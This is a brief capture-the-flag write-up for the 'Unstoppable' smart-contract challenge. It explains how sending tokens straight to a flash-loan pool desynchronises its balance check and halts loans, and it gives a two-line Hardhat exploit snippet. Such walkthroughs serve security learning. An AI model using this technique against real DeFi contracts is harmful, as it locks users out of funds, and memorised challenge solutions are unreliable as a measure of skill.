# Unstoppable

This challenge expects you to break the functionality of a flash loan.
This can be achieved by making a discrepency between the ```poolBalance``` and ```balanceBefore```
Increase the allowance and send some tokens from the attacker to the pool by using ```transfer``` instead of the ```depositTokens``` method that increments the ```poolBalance```


```
        await this.token.connect(attacker).increaseAllowance(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)     
```
